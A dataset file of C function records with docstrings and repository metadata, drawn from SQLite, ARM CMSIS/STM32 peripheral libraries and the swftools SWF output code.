{"docstring": "/*\n** Begin a read transaction on the WAL.\n**\n** This routine used to be called \"pagerOpenSnapshot()\" because it essentially\n** makes a snapshot of the database at the current point in time and preserves\n** that snapshot for use by the reader in spite of concurrently changes by\n** other writers or checkpointers.\n*/\n", "func_signal": "static int pagerBeginReadTransaction(Pager *pPager)", "code": "{\n  int rc;                         /* Return code */\n  int changed = 0;                /* True if cache must be reset */\n\n  assert( pagerUseWal(pPager) );\n  assert( pPager->eState==PAGER_OPEN || pPager->eState==PAGER_READER );\n\n  /* sqlite3WalEndReadTransaction() was not called for the previous\n  ** transaction in locking_mode=EXCLUSIVE.  So call it now.  If we\n  ** are in locking_mode=NORMAL and EndRead() was previously called,\n  ** the duplicate call is harmless.\n  */\n  sqlite3WalEndReadTransaction(pPager->pWal);\n\n  rc = sqlite3WalBeginReadTransaction(pPager->pWal, &changed);\n  if( rc!=SQLITE_OK || changed ){\n    pager_reset(pPager);\n  }\n\n  return rc;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** current_timestamp()\n**\n** This function returns the same value as datetime('now').\n*/\n", "func_signal": "static void ctimestampFunc(\n  sqlite3_context *context,\n  int NotUsed,\n  sqlite3_value **NotUsed2\n)", "code": "{\n  UNUSED_PARAMETER2(NotUsed, NotUsed2);\n  datetimeFunc(context, 0, 0);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** An SQL user-function registered to do the work of an DETACH statement. The\n** three arguments to the function come directly from a detach statement:\n**\n**     DETACH DATABASE x\n**\n**     SELECT sqlite_detach(x)\n*/\n", "func_signal": "static void detachFunc(\n  sqlite3_context *context,\n  int NotUsed,\n  sqlite3_value **argv\n)", "code": "{\n  const char *zName = (const char *)sqlite3_value_text(argv[0]);\n  sqlite3 *db = sqlite3_context_db_handle(context);\n  int i;\n  Db *pDb = 0;\n  char zErr[128];\n\n  UNUSED_PARAMETER(NotUsed);\n\n  if( zName==0 ) zName = \"\";\n  for(i=0; i<db->nDb; i++){\n    pDb = &db->aDb[i];\n    if( pDb->pBt==0 ) continue;\n    if( sqlite3StrICmp(pDb->zName, zName)==0 ) break;\n  }\n\n  if( i>=db->nDb ){\n    sqlite3_snprintf(sizeof(zErr),zErr, \"no such database: %s\", zName);\n    goto detach_error;\n  }\n  if( i<2 ){\n    sqlite3_snprintf(sizeof(zErr),zErr, \"cannot detach database %s\", zName);\n    goto detach_error;\n  }\n  if( !db->autoCommit ){\n    sqlite3_snprintf(sizeof(zErr), zErr,\n                     \"cannot DETACH database within transaction\");\n    goto detach_error;\n  }\n  if( sqlite3BtreeIsInReadTrans(pDb->pBt) || sqlite3BtreeIsInBackup(pDb->pBt) ){\n    sqlite3_snprintf(sizeof(zErr),zErr, \"database %s is locked\", zName);\n    goto detach_error;\n  }\n\n  sqlite3BtreeClose(pDb->pBt);\n  pDb->pBt = 0;\n  pDb->pSchema = 0;\n  sqlite3ResetAllSchemasOfConnection(db);\n  return;\n\ndetach_error:\n  sqlite3_result_error(context, zErr, -1);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Write an error message into pParse->zErrMsg that explains that the\n** user-supplied authorization function returned an illegal value.\n*/\n", "func_signal": "static void sqliteAuthBadReturnCode(Parse *pParse)", "code": "{\n  sqlite3ErrorMsg(pParse, \"authorizer malfunction\");\n  pParse->rc = SQLITE_ERROR;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Sync the file.\n**\n** Syncing an in-memory journal is a no-op.  And, in fact, this routine\n** is never called in a working implementation.  This implementation\n** exists purely as a contingency, in case some malfunction in some other\n** part of SQLite causes Sync to be called by mistake.\n*/\n", "func_signal": "static int memjrnlSync(sqlite3_file *NotUsed, int NotUsed2)", "code": "{\n  UNUSED_PARAMETER2(NotUsed, NotUsed2);\n  return SQLITE_OK;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Unless an \"EXPLAIN QUERY PLAN\" command is being processed, this function\n** is a no-op. Otherwise, it adds a single row of output to the EQP result,\n** where the caption is of the form:\n**\n**   \"USE TEMP B-TREE FOR xxx\"\n**\n** where xxx is one of \"DISTINCT\", \"ORDER BY\" or \"GROUP BY\". Exactly which\n** is determined by the zUsage argument.\n*/\n", "func_signal": "static void explainTempTable(Parse *pParse, const char *zUsage)", "code": "{\n  if( pParse->explain==2 ){\n    Vdbe *v = pParse->pVdbe;\n    char *zMsg = sqlite3MPrintf(pParse->db, \"USE TEMP B-TREE FOR %s\", zUsage);\n    sqlite3VdbeAddOp4(v, OP_Explain, pParse->iSelectId, 0, 0, zMsg, P4_DYNAMIC);\n  }\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Return UTF-16 encoded English language explanation of the most recent\n** error.\n*/\n", "func_signal": "SQLITE_API const void *sqlite3_errmsg16(sqlite3 *db)", "code": "{\n  static const u16 outOfMem[] = {\n    'o', 'u', 't', ' ', 'o', 'f', ' ', 'm', 'e', 'm', 'o', 'r', 'y', 0\n  };\n  static const u16 misuse[] = {\n    'l', 'i', 'b', 'r', 'a', 'r', 'y', ' ', \n    'r', 'o', 'u', 't', 'i', 'n', 'e', ' ', \n    'c', 'a', 'l', 'l', 'e', 'd', ' ', \n    'o', 'u', 't', ' ', \n    'o', 'f', ' ', \n    's', 'e', 'q', 'u', 'e', 'n', 'c', 'e', 0\n  };\n\n  const void *z;\n  if( !db ){\n    return (void *)outOfMem;\n  }\n  if( !sqlite3SafetyCheckSickOrOk(db) ){\n    return (void *)misuse;\n  }\n  sqlite3_mutex_enter(db->mutex);\n  if( db->mallocFailed ){\n    z = (void *)outOfMem;\n  }else{\n    z = sqlite3_value_text16(db->pErr);\n    if( z==0 ){\n      sqlite3ValueSetStr(db->pErr, -1, sqlite3ErrStr(db->errCode),\n           SQLITE_UTF8, SQLITE_STATIC);\n      z = sqlite3_value_text16(db->pErr);\n    }\n    /* A malloc() may have failed within the call to sqlite3_value_text16()\n    ** above. If this is the case, then the db->mallocFailed flag needs to\n    ** be cleared before returning. Do this directly, instead of via\n    ** sqlite3ApiExit(), to avoid setting the database handle error message.\n    */\n    db->mallocFailed = 0;\n  }\n  sqlite3_mutex_leave(db->mutex);\n  return z;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/* \n** The proxy lock file path for the database at dbPath is written into lPath, \n** which must point to valid, writable memory large enough for a maxLen length\n** file path. \n*/\n", "func_signal": "static int proxyGetLockPath(const char *dbPath, char *lPath, size_t maxLen)", "code": "{\n  int len;\n  int dbLen;\n  int i;\n\n#ifdef LOCKPROXYDIR\n  len = strlcpy(lPath, LOCKPROXYDIR, maxLen);\n#else\n# ifdef _CS_DARWIN_USER_TEMP_DIR\n  {\n    if( !confstr(_CS_DARWIN_USER_TEMP_DIR, lPath, maxLen) ){\n      OSTRACE((\"GETLOCKPATH  failed %s errno=%d pid=%d\\n\",\n               lPath, errno, getpid()));\n      return SQLITE_IOERR_LOCK;\n    }\n    len = strlcat(lPath, \"sqliteplocks\", maxLen);    \n  }\n# else\n  len = strlcpy(lPath, \"/tmp/\", maxLen);\n# endif\n#endif\n\n  if( lPath[len-1]!='/' ){\n    len = strlcat(lPath, \"/\", maxLen);\n  }\n  \n  /* transform the db path to a unique cache name */\n  dbLen = (int)strlen(dbPath);\n  for( i=0; i<dbLen && (i+len+7)<(int)maxLen; i++){\n    char c = dbPath[i];\n    lPath[i+len] = (c=='/')?'_':c;\n  }\n  lPath[i+len]='\\0';\n  strlcat(lPath, \":auto:\", maxLen);\n  OSTRACE((\"GETLOCKPATH  proxy lock path=%s pid=%d\\n\", lPath, getpid()));\n  return SQLITE_OK;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Compute the number of pages of cache requested.\n*/\n", "func_signal": "static int numberOfCachePages(PCache *p)", "code": "{\n  if( p->szCache>=0 ){\n    return p->szCache;\n  }else{\n    return (int)((-1024*(i64)p->szCache)/(p->szPage+p->szExtra));\n  }\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** Call the destructor for each auxdata entry in pVdbeFunc for which\n** the corresponding bit in mask is clear.  Auxdata entries beyond 31\n** are always destroyed.  To destroy all auxdata entries, call this\n** routine with mask==0.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VdbeDeleteAuxData(VdbeFunc *pVdbeFunc, int mask)", "code": "{\n  int i;\n  for(i=0; i<pVdbeFunc->nAux; i++){\n    struct AuxData *pAux = &pVdbeFunc->apAux[i];\n    if( (i>31 || !(mask&(((u32)1)<<i))) && pAux->pAux ){\n      if( pAux->xDelete ){\n        pAux->xDelete(pAux->pAux);\n      }\n      pAux->pAux = 0;\n    }\n  }\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/* \n** Test if the cell that cursor pCursor currently points to\n** would be filtered (excluded) by the constraints in the \n** pCursor->aConstraint[] array. If so, set *pbEof to true before\n** returning. If the cell is not filtered (excluded) by the constraints,\n** set pbEof to zero.\n**\n** Return SQLITE_OK if successful or an SQLite error code if an error\n** occurs within a geometry callback.\n**\n** This function assumes that the cell is part of a leaf node.\n*/\n", "func_signal": "static int testRtreeEntry(Rtree *pRtree, RtreeCursor *pCursor, int *pbEof)", "code": "{\n  RtreeCell cell;\n  int ii;\n  *pbEof = 0;\n\n  nodeGetCell(pRtree, pCursor->pNode, pCursor->iCell, &cell);\n  for(ii=0; ii<pCursor->nConstraint; ii++){\n    RtreeConstraint *p = &pCursor->aConstraint[ii];\n    RtreeDValue coord = DCOORD(cell.aCoord[p->iCoord]);\n    int res;\n    assert(p->op==RTREE_LE || p->op==RTREE_LT || p->op==RTREE_GE \n        || p->op==RTREE_GT || p->op==RTREE_EQ || p->op==RTREE_MATCH\n    );\n    switch( p->op ){\n      case RTREE_LE: res = (coord<=p->rValue); break;\n      case RTREE_LT: res = (coord<p->rValue);  break;\n      case RTREE_GE: res = (coord>=p->rValue); break;\n      case RTREE_GT: res = (coord>p->rValue);  break;\n      case RTREE_EQ: res = (coord==p->rValue); break;\n      default: {\n        int rc;\n        assert( p->op==RTREE_MATCH );\n        rc = testRtreeGeom(pRtree, p, &cell, &res);\n        if( rc!=SQLITE_OK ){\n          return rc;\n        }\n        break;\n      }\n    }\n\n    if( !res ){\n      *pbEof = 1;\n      return SQLITE_OK;\n    }\n  }\n\n  return SQLITE_OK;\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/* Force an SQLITE_TOOBIG error. */\n", "func_signal": "SQLITE_API void sqlite3_result_error_toobig(sqlite3_context *pCtx)", "code": "{\n  assert( sqlite3_mutex_held(pCtx->s.db->mutex) );\n  pCtx->isError = SQLITE_TOOBIG;\n  sqlite3VdbeMemSetStr(&pCtx->s, \"string or blob too big\", -1, \n                       SQLITE_UTF8, SQLITE_STATIC);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/*\n** This routine is a faster version of sqlite3PutVarint() that only\n** works for 32-bit positive integers and which is optimized for\n** the common case of small integers.  A MACRO version, putVarint32,\n** is provided which inlines the single-byte case.  All code should use\n** the MACRO version as this function assumes the single-byte case has\n** already been handled.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3PutVarint32(unsigned char *p, u32 v)", "code": "{\n#ifndef putVarint32\n  if( (v & ~0x7f)==0 ){\n    p[0] = v;\n    return 1;\n  }\n#endif\n  if( (v & ~0x3fff)==0 ){\n    p[0] = (u8)((v>>7) | 0x80);\n    p[1] = (u8)(v & 0x7f);\n    return 2;\n  }\n  return sqlite3PutVarint(p, v);\n}", "path": "addons\\SQLite\\extern\\sqlite\\sqlite3.c", "repo_name": "diederickh/roxlu_experimental", "stars": 37, "license": "None", "language": "c", "size": 445896}
{"docstring": "/**\n * @brief  Return the Control Register value\n* \n*  @return Control value\n *\n * Return the content of the control register\n */\n", "func_signal": "uint32_t __get_CONTROL(void)", "code": "{\n  uint32_t result=0;\n\n  __ASM volatile (\"MRS %0, control\" : \"=r\" (result) );\n  return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/** write decimal digits from a long signed int\n\t\\param v number to send\n*/\n", "func_signal": "void serwrite_int32(int32_t v)", "code": "{\n\tif (v < 0) {\n\t\tserial_writechar('-');\n\t\tv = -v;\n\t}\n\n\tserwrite_uint32(v);\n}", "path": "serial\\sermsg.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Return the Main Stack Pointer\n *\n * @return Main Stack Pointer\n *\n * Return the current value of the MSP (main stack pointer)\n * Cortex processor register\n */\n", "func_signal": "__ASM uint32_t __get_MSP(void)", "code": "{\n  mrs r0, msp\n  bx lr\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  STR Exclusive (16 bit)\n *\n * @param  value  value to store\n * @param  *addr  address pointer\n * @return        successful / failed\n *\n * Exclusive STR command for 16 bit values\n */\n", "func_signal": "uint32_t __STREXH(uint16_t value, uint16_t *addr)", "code": "{\n   uint32_t result=0;\n  \n   __ASM volatile (\"strexh %0, %2, [%1]\" : \"=r\" (result) : \"r\" (addr), \"r\" (value) );\n   return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/** write decimal digits from a long signed int\n\\param v number to send\n*/\n", "func_signal": "void serwrite_int32_vf(int32_t v, uint8_t fp)", "code": "{\n\tif (v < 0) {\n\t\tserial_writechar('-');\n\t\tv = -v;\n\t}\n\n\tserwrite_uint32_vf(v, fp);\n}", "path": "serial\\sermsg.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n  * @brief  Clears the EXTI's line pending flags.\n  * @param  EXTI_Line: specifies the EXTI lines flags to clear.\n  *   This parameter can be any combination of EXTI_Linex where x can be (0..19).\n  * @retval None\n  */\n", "func_signal": "void EXTI_ClearFlag(uint32_t EXTI_Line)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_EXTI_LINE(EXTI_Line));\n  \n  EXTI->PR = EXTI_Line;\n}", "path": "stm_lib\\src\\stm32f10x_exti.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  STR Exclusive (32 bit)\n *\n * @param  value  value to store\n * @param  *addr  address pointer\n * @return        successful / failed\n *\n * Exclusive STR command for 32 bit values\n */\n", "func_signal": "uint32_t __STREXW(uint32_t value, uint32_t *addr)", "code": "{\n   uint32_t result=0;\n  \n   __ASM volatile (\"strex %0, %2, [%1]\" : \"=r\" (result) : \"r\" (addr), \"r\" (value) );\n   return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Return the Base Priority value\n *\n * @return BasePriority\n *\n * Return the content of the base priority register\n */\n", "func_signal": "__ASM uint32_t  __get_BASEPRI(void)", "code": "{\n  mrs r0, basepri\n  bx lr\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Return the Fault Mask value\n *\n * @return FaultMask\n *\n * Return the content of the fault mask register\n */\n", "func_signal": "uint32_t __get_FAULTMASK(void)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"MRS %0, faultmask\" : \"=r\" (result) );\n  return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  LDR Exclusive (32 bit)\n *\n * @param  *addr  address pointer\n * @return        value of (*address)\n *\n * Exclusive LDR command for 32 bit values\n */\n", "func_signal": "uint32_t __LDREXW(uint32_t *addr)", "code": "{\n  __ASM(\"ldrex r0, [r0]\");\n  __ASM(\"bx lr\");\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Return the Priority Mask value\n *\n * @return PriMask\n *\n * Return state of the priority mask bit from the priority mask register\n */\n", "func_signal": "uint32_t __get_PRIMASK(void)", "code": "{\n  uint32_t result=0;\n\n  __ASM volatile (\"MRS %0, primask\" : \"=r\" (result) );\n  return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n  * @brief  Checks whether the specified EXTI line flag is set or not.\n  * @param  EXTI_Line: specifies the EXTI line flag to check.\n  *   This parameter can be:\n  *     @arg EXTI_Linex: External interrupt line x where x(0..19)\n  * @retval The new state of EXTI_Line (SET or RESET).\n  */\n", "func_signal": "FlagStatus EXTI_GetFlagStatus(uint32_t EXTI_Line)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_GET_EXTI_LINE(EXTI_Line));\n  \n  if ((EXTI->PR & EXTI_Line) != (uint32_t)RESET)\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  return bitstatus;\n}", "path": "stm_lib\\src\\stm32f10x_exti.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Reverse byte order in signed short value with sign extension to integer\n *\n * @param   value  value to reverse\n * @return         reversed value\n *\n * Reverse byte order in signed short value with sign extension to integer\n */\n", "func_signal": "__ASM int32_t __REVSH(int16_t value)", "code": "{\n  revsh r0, r0\n  bx lr\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Return the Main Stack Pointer\n *\n * @return Main Stack Pointer\n *\n * Return the current value of the MSP (main stack pointer)\n * Cortex processor register\n */\n", "func_signal": "uint32_t __get_MSP(void)", "code": "{\n  __ASM(\"mrs r0, msp\");\n  __ASM(\"bx lr\");\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n  * @brief  Clears the EXTI's line pending bits.\n  * @param  EXTI_Line: specifies the EXTI lines to clear.\n  *   This parameter can be any combination of EXTI_Linex where x can be (0..19).\n  * @retval None\n  */\n", "func_signal": "void EXTI_ClearITPendingBit(uint32_t EXTI_Line)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_EXTI_LINE(EXTI_Line));\n  \n  EXTI->PR = EXTI_Line;\n}", "path": "stm_lib\\src\\stm32f10x_exti.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Set the Main Stack Pointer\n *\n * @param  topOfMainStack  Main Stack Pointer\n *\n * Assign the value mainStackPointer to the MSP \n * (main stack pointer) Cortex processor register\n */\n", "func_signal": "__ASM void __set_MSP(uint32_t mainStackPointer)", "code": "{\n  msr msp, r0\n  bx lr\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n  * @brief  Fills each EXTI_InitStruct member with its reset value.\n  * @param  EXTI_InitStruct: pointer to a EXTI_InitTypeDef structure which will\n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void EXTI_StructInit(EXTI_InitTypeDef* EXTI_InitStruct)", "code": "{\n  EXTI_InitStruct->EXTI_Line = EXTI_LINENONE;\n  EXTI_InitStruct->EXTI_Mode = EXTI_Mode_Interrupt;\n  EXTI_InitStruct->EXTI_Trigger = EXTI_Trigger_Falling;\n  EXTI_InitStruct->EXTI_LineCmd = DISABLE;\n}", "path": "stm_lib\\src\\stm32f10x_exti.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Set the Control Register value\n *\n * @param  control  Control value\n *\n * Set the control register\n */\n", "func_signal": "__ASM void __set_CONTROL(uint32_t control)", "code": "{\n  msr control, r0\n  bx lr\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  Reverse byte order in unsigned short value\n *\n * @param  value  value to reverse\n * @return        reversed value\n *\n * Reverse byte order in unsigned short value\n */\n", "func_signal": "uint32_t __REV16(uint16_t value)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"rev16 %0, %1\" : \"=r\" (result) : \"r\" (value) );\n  return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/**\n * @brief  LDR Exclusive (16 bit)\n *\n * @param  *addr  address pointer\n * @return        value of (*address)\n *\n * Exclusive LDR command for 16 bit values\n */\n", "func_signal": "uint16_t __LDREXH(uint16_t *addr)", "code": "{\n    uint16_t result=0;\n  \n   __ASM volatile (\"ldrexh %0, [%1]\" : \"=r\" (result) : \"r\" (addr) );\n   return(result);\n}", "path": "cmsis\\core_cm3.c", "repo_name": "dccharacter/STM32_Servo_Controller", "stars": 40, "license": "None", "language": "c", "size": 379}
{"docstring": "/* TODO: move to ../lib/rfxswf */\n", "func_signal": "void changeRect(gfxdevice_t*dev, TAG*tag, int pos, SRECT*newrect)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    /* determine length of old rect */\n    tag->pos = pos;\n    tag->readBit = 0;\n    SRECT old;\n    swf_GetRect(tag, &old);\n    swf_ResetReadBits(tag);\n    int pos_end = tag->pos;\n\n    int len = tag->len - pos_end;\n    U8*data = (U8*)malloc(len);\n    memcpy(data, &tag->data[pos_end], len);\n    tag->writeBit = 0;\n    tag->len = pos;\n    swf_SetRect(tag, newrect);\n    swf_SetBlock(tag, data, len);\n    free(data);\n    tag->pos = tag->readBit = 0;\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* initialize the swf writer */\n", "func_signal": "void gfxdevice_swf_init(gfxdevice_t* dev)", "code": "{\n    memset(dev, 0, sizeof(gfxdevice_t));\n    \n    dev->name = \"swf\";\n\n    dev->internal = init_internal_struct(); // set config to default values\n\n    dev->startpage = swf_startframe;\n    dev->endpage = swf_endframe;\n    dev->finish = swf_finish;\n    dev->fillbitmap = swf_fillbitmap;\n    dev->setparameter = swf_setparameter;\n    dev->stroke = swf_stroke;\n    dev->startclip = swf_startclip;\n    dev->endclip = swf_endclip;\n    dev->fill = swf_fill;\n    dev->fillgradient = swf_fillgradient;\n    dev->addfont = swf_addfont;\n    dev->drawchar = swf_drawchar;\n    dev->drawlink = swf_drawlink;\n\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    i->dev = dev;\n\n    msg(\"<verbose> initializing swf output\\n\", i->max_x,i->max_y);\n\n    i->swffont = 0;\n   \n    i->swf = (SWF*)rfx_calloc(sizeof(SWF));\n    i->swf->fileVersion    = 0;\n    i->swf->frameRate      = 0x80;\n    i->swf->movieSize.xmin = 0;\n    i->swf->movieSize.ymin = 0;\n    i->swf->movieSize.xmax = 0;\n    i->swf->movieSize.ymax = 0;\n    i->swf->fileAttributes = 9; // as3, local-with-network\n    \n    i->swf->firstTag = swf_InsertTag(NULL,ST_SETBACKGROUNDCOLOR);\n    i->tag = i->swf->firstTag;\n    RGBA rgb;\n    rgb.a = rgb.r = rgb.g = rgb.b = 0xff;\n    //rgb.r = 0;\n    swf_SetRGB(i->tag,&rgb);\n\n    i->startdepth = i->depth = 0;\n    i->startids = i->currentswfid = 0;\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/*\n *  just another daily changing developer switch  \n */\n", "func_signal": "void lame_set_tune( lame_global_flags* gfp, float val )", "code": "{\n    gfp->tune_value_a = val;\n    gfp->tune = 1;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "// write a line-to command into the swf\n", "func_signal": "static void linetoxy(gfxdevice_t*dev, TAG*tag, plotxy_t p0)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    int px = twipsnap(p0.x);\n    int py = twipsnap(p0.y);\n    int rx = (px-i->swflastx);\n    int ry = (py-i->swflasty);\n    if(rx|ry) {\n\tswf_ShapeSetLine (tag, i->shape, rx,ry);\n\taddPointToBBox(dev, i->swflastx,i->swflasty);\n\taddPointToBBox(dev, px,py);\n    } /* this is a nice idea, but doesn't work with current flash\n         players (the pixel will be invisible if they're not\n         precisely on a pixel boundary) \n         Besides, we should only do this if this lineto itself\n         is again followed by a \"move\".\n         else if(!i->fill && i->config_dots) {\n       // treat lines of length 0 as plots, making them\n       // at least 1 twip wide so Flash will display them\n\t//plot(dev, i->swflastx, i->swflasty, tag);\n\tswf_ShapeSetLine (tag, i->shape, rx+1,ry);\n    }*/\n\n    i->shapeisempty = 0;\n    i->swflastx+=rx;\n    i->swflasty+=ry;\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "//HINSTANCE me =  GetModuleHandle(NULL);\n", "func_signal": "char* getInstallationPath()", "code": "{\n#if defined(WIN32)\n    char* path = getRegistryEntry(\"Software\\\\quiss.org\\\\swftools\\\\InstallPath\");\n    if(path)\n\treturn path;\n    else\n\treturn 0;\n#elif defined(CYGWIN)\n    return SWFTOOLS_DATADIR;\n#else\n    return SWFTOOLS_DATADIR;\n#endif\n}", "path": "lib\\os.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/*\n * Allow blocktypes to differ between channels.\n * default:\n *  0 for jstereo => block types coupled\n *  1 for stereo  => block types may differ\n */\n", "func_signal": "int\nlame_set_allow_diff_short( lame_global_flags*  gfp,\n                           int                 allow_diff_short )", "code": "{\n    gfp->short_blocks = \n        allow_diff_short ? short_block_allowed : short_block_coupled;\n\n    return 0;\n}", "path": "lib\\lame\\set_get.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* write a line, given two points and the transformation\n   matrix. */\n/*static void line(gfxdevice_t*dev, TAG*tag, plotxy_t p0, plotxy_t p1)\n{\n    moveto(dev, tag, p0);\n    lineto(dev, tag, p1);\n}*/\n", "func_signal": "void resetdrawer(gfxdevice_t*dev)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    i->swflastx = 0;\n    i->swflasty = 0;\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
{"docstring": "/* Perform cleaning up */\n", "func_signal": "static void swfoutput_destroy(gfxdevice_t* dev)", "code": "{\n    swfoutput_internal*i = (swfoutput_internal*)dev->internal;\n    if(!i) {\n        /* not initialized yet- nothing to destroy */\n        return;\n    }\n\n    fontlist_t *tmp,*iterator = i->fontlist;\n    while(iterator) {\n\tif(iterator->swffont) {\n\t    swf_FontFree(iterator->swffont);iterator->swffont=0;\n\t}\n        tmp = iterator;\n        iterator = iterator->next;\n        free(tmp);\n    }\n    if(i->swf) {swf_FreeTags(i->swf);free(i->swf);i->swf = 0;}\n\n    free(i);i=0;\n    memset(dev, 0, sizeof(gfxdevice_t));\n}", "path": "lib\\devices\\swf.c", "repo_name": "rpedroso/swftools", "stars": 48, "license": "gpl-2.0", "language": "c", "size": 11338}
